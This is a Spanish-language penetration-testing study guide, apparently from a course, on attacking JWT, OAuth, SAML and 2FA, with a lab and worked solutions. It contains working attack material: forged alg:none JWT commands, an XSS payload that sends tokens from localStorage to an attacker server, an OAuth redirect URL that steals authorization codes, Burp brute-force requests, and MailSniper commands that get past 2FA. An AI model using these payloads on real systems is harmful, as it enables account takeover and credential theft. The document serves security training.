# Atacar la autenticacion y el SSO

* Autenticación en aplicaciones web
* Atacando a JWT
* Atacar a Oauth
* Atacar SAML
* Omitir la 2FA

### Autenticación en aplicaciones web <a href="#authentication-in-web-apps" id="authentication-in-web-apps"></a>

Es el proceso de utilizar una credencial, conocida como identidad, para validar que la identidad tiene permiso para acceder al recurso. En este caso, el recurso es la aplicación web.

Nos centraremos en analizar la autenticación realizada a través de una combinación de nombre de usuario y contraseña, un token secreto (cookie) o un código de ping

#### Algunas características que usa la aplicación web <a href="#some-features-that-web-app-uses" id="some-features-that-web-app-uses"></a>

* JSON Web Token (JWT): un mecanismo compacto que se utiliza para transferir notificaciones entre dos partes
* OAuth: permite que una aplicación de terceros obtenga acceso limitado a un servicio HTTP, ya sea en nombre del propietario de un recurso mediante la orquestación de una interacción de aprobación entre el propietario del recurso y el servicio hTTP, o mediante la autorización de que la aplicación de terceros obtenga acceso en su propio nombre
* Lenguaje de marcado de aserción de seguridad (SAML): un estándar de inicio de sesión único basado en XML

Además:

```
- https://tools.ietf.org/html/rfc7519
- https://tools.ietf.org/html/rfc6749
- https://tools.ietf.org/html/rfc7522
```

#### 2FA <a href="#id-2fa" id="id-2fa"></a>

Las aplicaciones web modernas también utilizan una capa adicional de defensa cuando se trata de autenticación, la autenticación de 2 factores (2FA)

Es un método para verificar la identidad de un usuario utilizando una combinación de dos factores diferentes:

```
- Something you know (password)
- Something you have (OTP)
- Something you are  (biometric)
```

#### Derivaciones de 2FA <a href="#id-2fa-bypasses" id="id-2fa-bypasses"></a>

```
- Brute Force (when a secret of limited length is utilized)
- Less common interfaces (mobile app, XMLRPC, API instead of web)
- Forced Browsing
- Predictable/Reusable Tokens
```

### Tokens web JSON (JWT) <a href="#json-web-tokens-jwt" id="json-web-tokens-jwt"></a>

Según el sitio web oficial de JSON (https://jwt.io/introduction/), un JWT consta de las siguientes 3 piezas en su estructura:

```
- Header
- Payload
- Signature
```

En un **encabezado**, encontrará lo siguiente:

```
- Type of the token
- Signing algorithm
```

> Mientras que en una **carga útil**, encontrará las reclamaciones

#### La "firma" consiste en firmar: <a href="#the-signature-consists-of-signing" id="the-signature-consists-of-signing"></a>

```
- Encoded header
- Encoded payload
- A secret
- Algorithm specified in the header
```

#### Para firmar un token sin firmar, el proceso es el siguiente: <a href="#to-sign-an-unsigned-token-the-process-is-as-follows" id="to-sign-an-unsigned-token-the-process-is-as-follows"></a>

```
- unsignedToken = encodedBase64(header) + '.' + encodedBase64(payload)
- signature_encoded = encodedBase64(HMAC-SHA256("secret", unsignedToken))
- jwt_token = encodedBase64(header) + "." + encodedBase64(payload) + "." + signature_encoded
```

#### Datos de seguridad de JWT <a href="#jwt-security-facts" id="jwt-security-facts"></a>

JWT no es vulnerable a CSRF (excepto cuando JWT se coloca en una cookie)

* El robo de sesión a través de un ataque XSS es posible cuando se utiliza JWT
* Almacenamiento incorrecto de tokens (almacenamiento HTML5/cookie)
* A veces, la clave es débil y puede ser forzada
* Caducidad defectuosa del token
* JWT se puede utilizar como token de portador en un encabezado de autorización personalizado

JWT se utiliza para aplicaciones sin estado. El uso de JWT da como resultado que no haya almacenamiento del lado del servidor ni administración de sesiones basada en bases de datos. Toda la información se coloca dentro de un token JWT firmado:

* Confiar solo en la clave secreta
* No es posible cerrar sesión o invalidar usuarios específicos debido al enfoque sin estado anterior. Se utiliza la misma clave de firma para todos.

La autenticación basada en JWT puede volverse insegura cuando se confía ciegamente en los datos del lado del cliente dentro del JWT

Muchas aplicaciones aceptan ciegamente los datos contenidos en la carga útil (sin verificación de firma)

```
- try submitting various injection-related strings
- try changing a users role to admin
```

Muchas aplicaciones no tienen problemas para aceptar una firma vacía (de hecho, sin firma)

```
- the above is also known as "the admin party in JWT"
- this is by design, to support cases when tokens have already been verified through another way
- when assessing JWT endpoints set the alg to none and specify anything in the payload
```

Además, la información de seguridad de JWT:

→ https://www.reddit.com/r/netsec/comments/dn10q2/practical\_approaches\_for\_testing\_and\_breaking\_jwt/

#### Herramientas para evaluar/atacar JWT <a href="#tools-for-assessingattacking-jwt" id="tools-for-assessingattacking-jwt"></a>

→ https://github.com/KINGSABRI/jwtear

Ejemplo de creación de tokens firmados HMAC SHA256:

```
jwtear --generate-token --header '{"typ":"JWT","alg":"HS256"}' --payload '{"login":"admin"}' --key 'cr@zyp@ss'
```

Ejemplo de creación de token de firma vacío:

```
jwtear --generate-token --header '{"typ":"JWT","alg":"none"}' --payload '{"login":"admin"}'
```

Ejemplo de prueba para inyección:

```
jwtear --generate-token --header '{"typ":"JWT","alg":"none"}' --payload $'{"login":"admin\' or \'a\'=\'a"}'                  "
// $ is used to escapse single quotes
```

#### Escenario 1 del ataque JWT <a href="#jwt-attack-scenario-1" id="jwt-attack-scenario-1"></a>

Forzar brutamente/adivinar el secreto utilizado para firmar un token:

![[Pasted image 20240311160142.png]]
#### Escenario de ataque JWT 2 <a href="#jwt-attack-scenario-2" id="jwt-attack-scenario-2"></a>

Al atacar la autenticación a través de un vuln XSS, generalmente intentamos capturar una cookie de víctima de la siguiente manera:

```
<script>alert(document.cookie)</script>
```

Cuando se emplea JWT se utiliza un localStorage, podemos atacar la autenticación a través de XSS usando JSON.stringify:

```
 <img src='https://attacker-server/yikes?jwt='+JSON.stringify(localStorage);'--!>
```

> si obtiene un IdToken, puede usarlo para autenticar y suplantar a la víctima si obtiene un accessToken, puede usarlo para generar un newIdToken con la ayuda del punto de conexión de autenticación

#### Escenario de ataque JWT 3 <a href="#jwt-attack-scenario-3" id="jwt-attack-scenario-3"></a>

Un desafío CTF de bitcoin que incluyó a JWT:

* uppon inicio de sesión exitoso, el usuario recibe un JWT dentro de una cookie
* Se utiliza HS256
* Existe un usuario llamado admin
* Uno de los campos del encabezado JWT, kid, es utilizado por el servidor para recuperar la clave y verificar la firma. El problema es que no se produce una fuga adecuada mientras se hace.

> Si un atacante logra controlar o inyectar a kid', podrá crear sus propios tokens firmados (ya que **kid** es esencialmente la clave que se usa para verificar la firma)

Lo que podemos hacer: Inyecte **kid** y especifique un valor que resida en el servidor web y que pueda ser predicho (así como recuperado por el servidor, por supuesto)

* A través de errores provocadores, identificamos que la aplicación está usando **Sinatra** bajo el capó
* Dicho valor podría ser 'public/css/bootstrap.css' <: este valor proviene de la documentación/mejores prácticas de Sinatras y es un valor legítimo, ya que no se produce ningún escape adecuado al recuperar **kid**

![[Pasted image 20240311160201.png]]

![[Pasted image 20240311160213.png]]

### OAuth <a href="#oauth" id="oauth"></a>

Es el principal estándar web para la autorización entre servicios. Se utiliza para autorizar a las aplicaciones de terceros a acceder a servicios o datos de un proveedor con el que tiene una cuenta.

#### Componentes de OAuth: <a href="#oauth-components" id="oauth-components"></a>

* **Propietario del recurso**: la entidad que puede conceder acceso a un recurso protegido. Normalmente, se trata del usuario final
* **Cliente**: una aplicación que solicita acceso a un recurso protegido en nombre del propietario del recurso. Esto también se denomina usuario de confianza
* **Servidor de** recursos: el servidor que aloja los recursos protegidos. Esta es la API a la que quieres acceder, en nuestra galería de casos
* **Servidor de autorización**: el servidor que autentica al propietario del recurso y emite tokens de acceso después de obtener la autorización adecuada. Esto también se denomina proveedor de identidad (IdP)
* **Agente de Usuario**: el agente utilizado por el Propietario del Recurso para interactuar con el Cliente, por ejemplo un navegador o una aplicación móvil.

#### Ámbitos de OAuth (acciones o privilegios solicitados al servicio, visibles a través del parámetro scope): <a href="#oauth-scopes-actions-or-privilege-requested-from-the-service---visible-through-the-scope-parameter" id="oauth-scopes-actions-or-privilege-requested-from-the-service---visible-through-the-scope-parameter"></a>

```
- Read
- Write
- Access Contacts
```

#### OAuth 2.0 <a href="#oauth-20" id="oauth-20"></a>

1. La **concesión del código de autorización**: el cliente redirige al usuario (propietario del recurso) a un servidor de autorización para preguntar al usuario si el cliente puede acceder a sus recursos. Después de que el usuario confirme, el Cliente obtiene un Código de Autorización que el Cliente puede intercambiar por un Token de Acceso. Este token de acceso permite al cliente acceder a los recursos del propietario de los recursos.
2. La concesión implícita es una simplificación de la **concesión** del código de autorización. El cliente obtiene el token de acceso directamente en lugar de recibir un código de autorización.
3. La **concesión de credenciales** de contraseña de propietario del recurso permite al cliente obtener un token de acceso mediante el nombre de usuario y la contraseña del propietario del recurso.
4. La concesión de credenciales de cliente permite al cliente obtener un token de acceso mediante sus propias **credenciales**.

> Los clientes pueden obtener **tokens de acceso** a través de 4 flujos diferentes Los clientes utilizan estos **tokens de acceso** para acceder a una API

> Los **tokens de acceso** son casi siempre un token al portador Algunas aplicaciones utilizan JWT como tokens de acceso

### Ataques comunes de OAuth <a href="#common-oauth-attacks" id="common-oauth-attacks"></a>

![[Pasted image 20240311160230.png]]

#### Parámetro RedirectURI no validado <a href="#unvalidated-redirecturi-parameter" id="unvalidated-redirecturi-parameter"></a>

Si el servidor de autorización no valida que el URI de redireccionamiento pertenece al cliente, es susceptible a dos tipos de ataques:

* Redireccionamiento abierto
* Secuestro de cuentas mediante el robo de códigos de autorización.

![[Pasted image 20240311160245.png]]

> Si un atacante redirige a un sitio bajo su control, se le proporciona el código de autorización, que forma parte del URI. Es posible que puedan intercambiar por un token de acceso y, por lo tanto, obtener acceso a los recursos de los usuarios.

#### Códigos de autorización débiles <a href="#weak-authorization-codes" id="weak-authorization-codes"></a>

Si los códigos de autorización son débiles, es posible que un atacante pueda adivinarlos en el punto de conexión del token. Esto es especialmente cierto si el secreto de cliente está en peligro, no se usa o no se valida.

![[Pasted image 20240311160258.png]]

#### Códigos de autorización eternos <a href="#everlasting-authorization-codes" id="everlasting-authorization-codes"></a>

La caducidad de los códigos de autorización no utilizados limita la ventana en la que un atacante puede usar los códigos de autorización capturados o adivinados, pero no siempre es así.
![[Pasted image 20240311160316.png]]
#### Códigos de autorización no vinculados al cliente <a href="#authorization-codes-not-bound-to-client" id="authorization-codes-not-bound-to-client"></a>

Un atacante puede intercambiar códigos de autorización capturados o adivinados para tokens de acceso mediante las credenciales para otro cliente potencialmente malintencionado.
![[Pasted image 20240311160327.png]]
#### Acceso débil basado en identificadores y tokens de actualización <a href="#weak-handle-based-access-and-refresh-tokens" id="weak-handle-based-access-and-refresh-tokens"></a>

Si los tokens son débiles, es posible que un atacante pueda adivinarlos en el servidor de recursos o en el punto de conexión del token.
![[Pasted image 20240311160340.png]]
### Almacenamiento inseguro de tokens de actualización y acceso basados en identificadores <a href="#insecure-storage-of-handle-based-access-and-refresh-tokens" id="insecure-storage-of-handle-based-access-and-refresh-tokens"></a>

Si los tokens basados en identificadores se almacenan como texto sin formato, es posible que un atacante pueda obtenerlos de la base de datos del servidor de recursos o del punto de conexión del token.
![[Pasted image 20240311160404.png]]
#### Token de actualización no enlazado al cliente <a href="#refresh-token-not-bound-to-client" id="refresh-token-not-bound-to-client"></a>

Si no se valida el enlace entre un token de actualización y el cliente, es posible que un cliente malintencionado pueda intercambiar tokens de actualización capturados o adivinados por tokens de acceso. Esto es especialmente problemático si la aplicación permite el registro automático de clientes.
![[Pasted image 20240311160418.png]]
#### Escenario 2 de ataque de OAuth <a href="#oauth-attack-scenario-2" id="oauth-attack-scenario-2"></a>

En este escenario, vamos a ver que un vuln XSS basado en OAuth se encadenó con un encabezado X-Frame-Options inseguro y una funcionalidad de autocompletar habilitada para proporcionar al atacante credenciales de usuario/administrador.

> Este ataque fue descubierto durante el pentesting de las primeras iteraciones del Open Bank Project (OBP)

Paso 0: Identificamos que el parámetro redirectUrl es vulnerable a ataques de secuencias de comandos entre sitios reflejados (XSS) debido a una desinfección inadecuada de los datos proporcionados por el usuario.

```
Vulnerable parameter: 'redirectUrl'
Page resource: 'http://openbankdev:8080/oauth/thanks'
Attack vector: http://openbankdev:8080/oauth/thanks?redirectUrl=[JS attack vector]
```

**Paso 1**:

La siguiente imagen muestra que pudimos cargar un JavaScript malicioso en la página web OBP vulnerable desde una ubicación externa. La carga útil representada es específica de jQuery.
![[Pasted image 20240311160430.png]]
**Paso 2**:

Utilizando la inyección de JavaScript, creamos un iframe invisible que contenía la página de inicio de sesión de OBP. Esto fue posible gracias al hecho de que el encabezado X-Frame-Options de la página de inicio de sesión de OBP se estableció en el valor SAMEORIGIN.
![[Pasted image 20240311160439.png]]
**Paso 3**:

Finalmente inyectamos el siguiente código JavaScript para acceder a los formularios iframes que contenían credenciales de usuario debido al hecho de que la funcionalidad de autocompletar no estaba explícitamente deshabilitada
![[Pasted image 20240311160448.png]]
**Paso 4**:

Un agente de escucha netcat configurado previamente recibió la contraseña de los usuarios del targer
![[Pasted image 20240311160457.png]]
**Paso de bonificación**:

También encadenamos el vuln XSS basado en OAuth mencionado anteriormente con el encabezado X-Frame-Options insuficientemente seguro de la página **GET API Key** (que se estableció en SAMEORIGIN) y una vulnerabilidad CSRF en la funcionalidad de creación de API
![[Pasted image 20240311160507.png]]
**Paso de bonificación**:

Finalmente inyectamos una función de JavaScript, similar a la utilizada para el ataque de robo de credenciales remotas, para acceder al contenido de los iframes, incluida la clave API de aplicaciones creadas. Esta vez, se produjo un ataque remoto de robo de claves de API.
![[Pasted image 20240311160519.png]]
#### Escenario 3 de ataque de OAuth <a href="#oauth-attack-scenario-3" id="oauth-attack-scenario-3"></a>

Atacar la solicitud **de conexión**

* Este ataque explota la primera solicitud (cuando un usuario hace clic en el botón **Conectar** o **Iniciar sesión con**).
* Muchas veces, los sitios web permiten a los usuarios conectar cuentas adicionales como Google, utilizando OAuth. Un atacante puede obtener acceso a la cuenta de la víctima en el Cliente conectando una de sus propias cuentas (en el Proveedor)
![[Pasted image 20240311160531.png]]
#### Escenario 4 de ataque de OAuth <a href="#oauth-attack-scenario-4" id="oauth-attack-scenario-4"></a>

CSRF sobre la respuesta de autorización

* OAuth 2.0 proporciona seguridad contra ataques similares a CSRF a través del parámetro state. Este parámetro se pasa en la 2ª y 3ª solicitud del **baile** de OAuth. Actúa como un token CSRF.

En las implementaciones más recientes de OAuth, este parámetro no es necesario y es opcional.

> Si se encuentra en una implementación en la que no se utiliza este parámetro, puede probar el flujo de ataque a su derecha.
![[Pasted image 20240311160600.png]]
### Lenguaje de marcado de aserción de seguridad (SAML) <a href="#security-assertion-markup-language-saml" id="security-assertion-markup-language-saml"></a>

Documentación oficial:

```
http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0-cd-02.html#2.Overview|outline
```

* OASIS SAML define un marco basado en XML para describir e intercambiar información de seguridad entre socios comerciales en línea.
* define la sintaxis y las reglas precisas para solicitar, crear, comunicar y usar estas aserciones SAML.
![[Pasted image 20240311160613.png]]
#### Consideraciones de seguridad de SAML <a href="#saml-security-considerations" id="saml-security-considerations"></a>

Un atacante puede interferir durante el paso 5 en el flujo de trabajo de SAML y alterar la respuesta de SAML enviada al proveedor de servicios (SP). Los valores de las aserciones emitidas por IDP pueden reemplazarse de esta manera.

* Es posible que una implementación SAML insegura no verifique la firma, lo que permite el secuestro de cuentas

Se emplea una transformación de canonicalización XML al firmar el documento XML, para producir la misma dignature para documentos lógica o semánticamente similares.

```
https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability#cryptographic-signing-issues
```
![[Pasted image 20240311160628.png]]
#### Escenario de ataque SAML <a href="#saml-attack-scenario" id="saml-attack-scenario"></a>

Supongamos que estamos evaluando una implementación de SAML

Queremos comprobar si un atacante es capaz de manipular con éxito la respuesta SAML enviada al proveedor de servicios (SP). En esencia, queremos comprobar si un atacante puede reemplazar los valores de las aserciones liberadas por el IDP.
![[Pasted image 20240311160638.png]]
Por lo tanto, copiamos la respuesta SAML (usando BURP)

y cambie mediante programación el nombre de usuario en el XML a uno de un administrador identificado. El ataque no tuvo éxito

```
Invalid Signature on SAML Response
```

¿Significa esto que la implementación de SAML es segura? Intentemos realizar un ataque de eliminación de firmas antes de decirlo.

Durante los ataques de eliminación de firmas contra SAML, simplemente eliminamos el valor de SignatureValue (la etiqueta permanece)

* Todo lo que tenemos que hacer es codificar todo de nuevo y enviar nuestra respuesta SAML elaborada
* Para nuestra sorpresa, el servidor remoto aceptó nuestra solicitud elaborada, lo que nos permitió iniciar sesión como el usuario administrador objetivo
![[Pasted image 20240311160650.png]]
> Tenga en cuenta los ataques de strpping de firmas al evaluar las implementaciones de SAML

#### Recursos <a href="#resources" id="resources"></a>

```
- http://www.economyofmechanism.com/github-saml
- https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e
# its a BURP extension 
```

### Derivaciones comunes de 2FA <a href="#common-2fa-bypasses" id="common-2fa-bypasses"></a>

```
- Brute Force (when a secret of limited length is utilized)
- Less common interfaces (mobile app, XMLRPC, API instead of web)
- Forced Browsing
- Predictable / Reusable Tokens
```

#### Interfaces menos comunes <a href="#less-common-interfaces" id="less-common-interfaces"></a>

1. Cómo los atacantes suelen eludir la 2FA durante los ataques a MS Exchange
2. Cómo pudimos eludir la implementación de 2FA de un sitio web de gestión de existencias/seguros

#### Escenario 1 de derivación de 2FA <a href="#id-2fa-bypass-scenario-1" id="id-2fa-bypass-scenario-1"></a>

Exchange Web Services (EWS) es un protocolo de acceso remoto

* Su esencialmente SOAP sobre HTTP se usa predominantemente en aplicaciones, dispositivos móviles Windows, etc., y especialmente en las versiones más recientes de Exchange

Por ejemplo, el ataque contra Exchange se puede realizar utilizando la herramienta MailSniper

→ https://github.com/dafthack/MailSniper

Después de identificar credenciales válidas

```
Import-Module .\MailSniper.ps1
Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -remote
```

* Al probar la herramienta anterior en nuestro dominio de prueba, **ELS**, contra la cuenta JeremyDoyle@els.local protegida por 2FA se obtuvo lo siguiente.
* El acceso al buzón de los usuarios se logró utilizando solo las credenciales identificadas.
* La 2FA fue subvertida con éxito
![[Pasted image 20240311160705.png]]
#### Escenario 2 de derivación de 2FA <a href="#id-2fa-bypass-scenario-2" id="id-2fa-bypass-scenario-2"></a>

Durante una prueba de penetración externa, nos encontramos con una implementación de 2FA en una aplicación web que estaba relacionada con la gestión de existencias y seguros. Como parte de la evaluación, intentamos eludir la implementación de 2FA aprovechando el hecho de que el **canal** móvil no ofrecía una opción de 2FA

Un usuario malintencionado que no es de 2FA encuentra de alguna manera las credenciales de un usuario de 2FA (por ejemplo, a través de un ataque de ingeniería social)

* El usuario malintencionado quiere iniciar sesión, utilizando las credenciales adquiridas, a través de la aplicación web y no a través de la aplicación móvil, ya que la aplicación web tiene una funcionalidad adicional.
* Para lograrlo, tendrá que encontrar una manera de eludir el mecanismo de 2FA vigente

**Paso a paso**

1. Iniciamos sesión a través de la aplicación móvil como un usuario que no era de 2FA (el atacante), anotamos el token CSRF cifrado para su uso posterior y mantuvimos viva la sesión
![[Pasted image 20240311160715.png]]
1. Iniciamos una secuencia de inicio de sesión como usuario de 2FA, cuyas credenciales se adquirieron, a través de la aplicación web, pero manipulamos las solicitudes de secuencia de inicio de sesión para que se procesaran a través del backend de las aplicaciones móviles.

* Durante los pasos de manipulación de la secuencia de inicio de sesión mencionados anteriormente, utilizamos los valores de cookies proporcionados por el backend de la aplicación web
![[Pasted image 20240311160727.png]]![[Pasted image 20240311160736.png]]
1. Realizamos una solicitud POST a través del navegador solicitando

* https://uat.xxxx.com/xxxParticipant/mobile/services/initial\_load.htm:ENC=\[token CSRF del atacante]
* utilizando el token CSRF del usuario que no es de 2FA (el atacante) y las cookies de los usuarios de 2FA, como se mencionó anteriormente.
![[Pasted image 20240311160750.png]]
1. La aplicación web respondió con un mensaje de error de autorización 403 dos veces.
![[Pasted image 20240311160809.png]]
1. Realizamos una solicitud GET a través del navegador solicitando

* https://uat.xxxx.com/xxxParticipant
* Y finalmente pudimos navegar a través de la aplicación web como usuario de 2FA sin pasar por el mecanismo de 2FA implementado.
![[Pasted image 20240311160822.png]]
### Laboratorio <a href="#lab" id="lab"></a>

Configuración de red

```
- The target application can be found at http://gallery:3005
- The username is koen and the password is password.
```

#### Tareas <a href="#tasks" id="tasks"></a>

Tarea 1. Cree una prueba de concepto de robo de código:

```
- Craft an URL that can be sent to a victim in order to steal the authorization code once he/she logs in into the /oauth endpoint. 
- You can use the following data: the response type is "code", the scope is "view_gallery" and the client_id is "photoprint".
```

Tarea 2. Use el código adquirido para forzar el secreto de cliente:

```
- Use a POST request to the /token endpoint in order to bruteforce the  client secret. 
- Consult with OAuth's documentation to recreate the  request. The grant type is "authorization_code"
```

Tarea 3. Descubra otra vulnerabilidad de token:

```
- Discover another vulnerability by abusing the /photos/me?access_token= endpoint.
```

#### Soluciones <a href="#solutions" id="solutions"></a>

A continuación, puede encontrar soluciones para cada tarea. Sin embargo, recuerda que puedes seguir tu propia estrategia, que puede ser diferente de la que se explica en el siguiente laboratorio.

Tarea 1. Crear una prueba de concepto de robo de código

En función de la documentación de OAuth disponible en https://tools.ietf.org/html/rfc6749 puede construir la siguiente solicitud GET. Tenga en cuenta que debe cerrar la sesión al visitar esta URL.

```
http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fattacker%2Fcallback&scope=view_gallery&client_id=photoprint
```

Al iniciar sesión, hay una **pantalla de consentimiento**, que debe aceptarse, al igual que un inicio de sesión normal a través de OAuth.

A continuación, se redirige al usuario al sitio web del **atacante** con el código de autorización en el valor de devolución de llamada. Cualquier usuario al que se le envíe la URL anterior e inicie sesión a través de ella, realizará una solicitud al sitio web del atacante revelando el código de autorización.

La vulnerabilidad subyacente es una redirección no validada.

Tarea 2. Usar el código adquirido para forzar el secreto del cliente

En función de una solicitud de token de ejemplo (https://auth0.com/docs/api-auth/tutorials/authorization-code-grant), puede construir la siguiente solicitud POST.

```
POST /token HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&grant_type=authorization_code&client_id=photoprint&client_secret=§guess§&code=44438Note: 
```

* Copiar y pegar la solicitud anterior puede dar lugar a problemas de formato que harán que la solicitud HTTP tenga un formato incorrecto.
* La mejor manera de reproducir esa solicitud es iniciar sesión como se describe en el manual (obteniendo el primer código), capturar la solicitud usando Burp y enviarla a Repeater.
* Usando Burp Intruder y una lista de palabras (usamos Rockyou-10 disponible aquí) puedes forzar el secreto del cliente.

Después de iniciar el ataque, pronto nos damos cuenta de que el secreto del cliente es **secreto**.

En la ventana Repetidor:

```
POST /token HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 136
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&grant_type=authorization_code&client_id=photoprint&client_secret=secret&code=44438
Note: Specify the code that you received in the response.  
The response access token can now be supplied to the /photos/me?access_token= endpoint.
GET /photos/me?access_token=35580 HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

> \[Nota] Asegúrese de reemplazar el código de acceso en la solicitud anterior con el que recibe de la solicitud anterior a esta.

Tarea 3. Descubre otra vulnerabilidad de token

```
# At /photos/me?access_token=[code] you are able to bruteforce the valid token. This will require the following Burp Intruder configuration:  

GET /photos/me?access_token=§§ HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

> De esta manera, un atacante puede comprometer tokens activos a través de la fuerza bruta de forma ilimitada.

> \[Nota] En una aplicación real, puede haber varios tokens activos. Como solo tenemos un token activo, el tiempo para el refuerzo bruto podría ser mucho más largo.
